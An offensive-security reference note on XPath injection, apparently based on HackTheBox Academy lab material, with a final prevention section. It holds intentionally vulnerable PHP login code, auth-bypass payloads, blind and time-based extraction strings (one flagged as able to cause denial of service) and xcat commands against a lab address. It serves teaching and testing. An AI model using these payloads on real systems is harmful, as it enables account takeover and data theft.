---
technique: "XPath Injections"
family: "injection"
severity_hint: "high"
tags: ["Authentication", "Account Takeover", "xPath", "XML", "Microsoft"]
source: "_raw/Web attacks/Web Attacks/XPath Injections.md"
curator_version: 2
review_status: imported-unreviewed
---

# XPath Injections

> Family: **injection** · Severity hint: **high** · Tags: Authentication, Account Takeover, xPath, XML, Microsoft
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: xcat.

## Overview

XPath injection happens when user input is concatenated unsanitized into an XPath query used to search an XML document — the XML analog of SQL injection. Since XML documents are frequently used to store data like user credentials, a successful injection can bypass authentication, enumerate node names and values blind, and exfiltrate an entire XML document one character at a time even when no query results are ever displayed directly.

## Auth Bypass

Example of an XML document storing user data:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```

An application can perform an XPath query to authenticate a user:

```xml
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

Vulnerable PHP code inserts the username and password without sanitization into the query:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

Inject a payload into the username and password so the XPath query always evaluates to true:

```xml
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

The query returns all usernames and logs in as the first user in the list. Choose a specific username with `admin' or '1'='1`:

```xml
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```

### Exploitation against hashed passwords

In the real world, passwords are often hashed and a valid username may not be known:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>8a24367a1f46c141048752f2d5bbd14b</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>obfuscatedadminuser</username>
		<password>21232f297a57a5a743894a0e4a801fc3</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>295362c2618a05ba3899904a6a3f5bc0</password>
	</user>
</users>
```

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```

```php
/users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Inject a double `or` clause in the username to force the query true:

```php
/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Target a specific node with `position()`, which returns only the node at that position — `' or position()=2 or '`:

```php
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Not applicable when there are a lot of users. Use `contains()` to check whether a text is present in the string instead — `' or contains(.,'admin') or '`:

```php
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

## Data Exfiltration

### Simple Data Exfiltration

Given a web application that allows querying data and reveals two node names, `fullstreetname` and `streetname`, the app's behavior lets us deduce the XPath query's shape. Since the element node names in the XML document aren't known, denote the path with single-character placeholders `a`, `b`, `c`, `d`. The query most likely looks like `/a/b/c/[contains(d/text(), 'BAR')]/fullstreetname`.

> Note: the depth of the XML schema is not necessarily three (`/a/b/c`) — that still needs to be confirmed.

The document likely looks like:

```xml
<a>
	<b>
		<c>
			<d>???</d>
			<streetname>BARCELONA</streetname>
			<fullstreetname>BARCELONA AVE</fullstreetname>
		</c>
	</b>
</a>
```

### Confirming XPath Injection

Confirm by sending a payload like `SOMETHINGINVALID') or ('1'='1` in the `q` parameter:

```xml
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
```

### Exfiltrating Data

Append a new query that returns all text nodes:

```python
GET /index.php?q=SOMETHINGINVALID&f=fullstreetname+|+//text() HTTP/1.1
Host: xpath-exfil.htb
```

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | //text()
```

Same result using the `q` parameter via `SOMETHINGINVALID') or ('1'='1` and setting the `f` parameter to `../../..//text()`:

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

## Advanced Data Exfiltration

If dumping the entire XML document isn't allowed, first determine the schema depth. Make the original XPath query return no results and append a new query that gives information about the depth using `| /*[1]`:

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```

The subquery `/*[1]` starts at the document root `/`, moves one node down the tree via the wildcard `*`, and selects the first child via the predicate `[1]`. The web application expects a `string` but receives an `array` and is unable to print the results, resulting in an empty response:

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[1]/*[1]/*[1]` | `01ST ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |

This shows the depth must be `4`. Exfiltrate the data by increasing the position until no more data can be retrieved:

| `fullstreetname | /*[1]/*[1]/*[1]/*[1]` | `01ST ST` |
| --- | --- |
| `fullstreetname | /*[1]/*[1]/*[1]/*[2]` | `01ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[3]` | `ST` |
| `fullstreetname | /*[1]/*[1]/*[1]/*[4]` | `No Results!` |

Fill in the known XML structure (exact node names still unknown):

```xml
<a>
	<b>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</b>
</a>
```

Extract more street data:

```xml
fullstreetname | /*[1]/*[1]/*[2]/*[1]	02ND AVE
fullstreetname | /*[1]/*[1]/*[2]/*[2]	02ND
fullstreetname | /*[1]/*[1]/*[2]/*[3]	AVE
fullstreetname | /*[1]/*[1]/*[2]/*[4]	No Results!
```

### Dumping more data

Example XML file with multiple data sets:

```xml
<dataset>                         <!-- START [1] -->
	
	<streets>                       <!-- START First data set [1][1] -->
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</streets>                      <!-- END First data set [1][1] -->
	
	<users>                         <!-- START Second data set [1][2] -->
		<group name="users">          <!-- [1][2][1] -->
			<user>                      <!-- [1][2][1][1] -->
				<username>test</username> <!-- [1][2][1][1][1] -->
				<password>test</password> <!-- [1][2][1][1][2] -->
			</user>
		</group>
		<group name="admins">
			<user>
				<username>admin</username>
				<password>admin</password>
			</user>
		</group>
	</users>                        <!-- ENDSecond data set [1][2] -->
	
</dataset>                        <!-- END [1] -->
```

`street` has depth 3 while `user` has depth 4 (`/dataset/users/group/user`) and `username` a depth of 5. Determine the depth again using the same approach:

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]/*[2]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]` | Nothing |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]` | `htb-stdnt` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |

| **Value of the `f` GET parameter** | **Response** |
| --- | --- |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1]` | `htb-stdnt` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[2]` | `295362c2618a05ba3899904a6a3f5bc0` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[3]` | `HackTheBox Academy Student Account` |
| `fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[4]` | `No Results!` |

> Note: to exfiltrate an entire XML document, it makes sense to implement a simple script that automates the exfiltration.

## Blind Exploitation

### Methodology

Use `name()`, `substring()`, `string-length()`, and `count()`:
- `name()` — called on any node, gives the name of that node.
- `substring()` — exfiltrates the name of a node one char at a time.
- `string-length()` — determines the length of a node name to know when to stop exfil.
- `count()` — returns the number of children of an element node.

> Note: if the XPath injection point is not inside a predicate, apply the same methodology by appending a custom predicate.

### Exploitation

Imagine a login form with user enumeration (a valid user returns a different response than an invalid one). `/*[1]` selects the root element node.

**Confirming XPath Injection** — assume something like `/users/user[username='admin']` (inserted into the predicate `[username='admin']`). Confirm by supplying the username `invalid' or '1'='1`:

```xml
/users/user[username='invalid' or '1'='1']
```

Should be invalid, but the query still returns true due to the `or`.

**Exfiltrating the Length of a Node's Name** — `invalid' or string-length(name(/*[1]))=1 and '1'='1`:

```xml
/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
```

Data is only returned when `string-length(name(/*[1]))=1` is true. Increase until the application returns success (e.g. `string-length(name(/*[1]))=5`). Operators like `<`, `<=`, `>`, `>=` can speed up the search.

**Exfiltrating a Node's Name** — `invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`:

```xml
/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']
```

Returns data only if the first character of the root node's name equals `a`. Check each char until a success message comes back — e.g. `invalid' or substring(name(/*[1]),2,1)='a' and '1'='1` — until a node called `users` is found.

**Exfiltrating the Number of Child Nodes** — enumerate the number of child nodes with `invalid' or count(/users/*)=1 and '1'='1`:

```xml
/users/user[username='invalid' or count(/users/*)=1 and '1'='1']
```

Return to the previous steps to target the `users` node's first child via `/users/*[1]` (name length, then name itself). Repeat until reaching the maximum depth — target the second child via `/users/*[2]`:

```xml
<users>
	<user> <!-- /users/*[1] -->
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
	<user> <!-- /users/*[2] -->
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
</users>
```

**Exfiltrating Data** — re-use the same length/substring methodology on any node value. Example, exfiltrating a username:
- Find the length: `invalid' or string-length(/users/user[1]/username)=1 and '1'='1`
- Exfiltrate: `invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`

> Note: writing a small script for this task is recommended.

### Time-based Exploitation

XPath has no sleep function, but the response time can be used as an oracle when the application always serves the same response. Force the application to iterate over the XML document exponentially — measurably slower — by calling `count()` recursively with stacked predicates:

```xml
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

If `substring(/users/user[1]/username,1,1)='a'` is true, `count((//.)[count((//.))])` is evaluated, causing a time delay.

> Note: if the XML document is small, additional stacked predicates with calls to `count()` may be needed to achieve a measurable difference in processing time.

> Warning: this technique may quickly result in a DoS condition against the target.

## Tools & Prevention

### XCAT

[https://github.com/orf/xcat](https://github.com/orf/xcat) — needs a lower Python version like 3.9.11; did not work with 3.11.

- `detect`: detect XPath injection and print the type of injection found.
- `injections`: print all types of injection supported by xcat.
- `ip`: print the current external IP address.
- `run`: retrieve the XML document by exploiting the XPath injection.
- `shell`: xcat shell to run system commands.

**Data Exfiltration** — supply a list of GET parameters and a true-string specifying whether the query returned data, then use `detect` or `run`. Example: set the `q` and `f` parameters, test `q`, and set the true-string to `!No Result` (meaning if this message doesn't show, data came back):

```bash
xcat detect http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result'
```

**Blind XPath Injection**:

```bash
xcat detect http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
```

### Prevention

While prepared statements/stored procedures can prevent injections in SQL queries, not all programming languages and libraries provide an equivalent for XPath queries. Proper (manual) sanitization is therefore the only universal method of preventing XPath injection vulnerabilities.

Treat all user input as untrusted and sanitize it before inserting it into an XPath query. The simplest and most secure way is a whitelist that only allows alphanumeric characters in user input inserted into the query — reject any input containing non-whitelisted characters.

Additionally, verify the expected data type and format during sanitization. If the application expects an integer, verify the input consists of only digits. When applicable, perform semantic checks too — e.g. if a variable can only assume a fixed set of values (like the GET parameter `f` above, which can only be `fullstreetname` or `streetname`), check that user input matches one of those values.

Alternatively, a blacklist approach blocking the following XPath control characters is also sufficient, though a whitelist is always preferable:

- Single quote: `'`
- Double quote: `"`
- Slash: `/`
- At: `@`
- Equals: `=`
- Wildcard: `*`
- Brackets: `[`, `]`, and parentheses `(`, `)`

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/XPath Injections.md`
- `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Authentication Bypass.md`
- `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Data Exfiltration.md`
- `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Advanced Data Exfiltration.md`
- `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Blind Exploitation.md`
- `_raw/Web attacks/Web Attacks/XPath Injections/XPath Tools & Prevention.md`
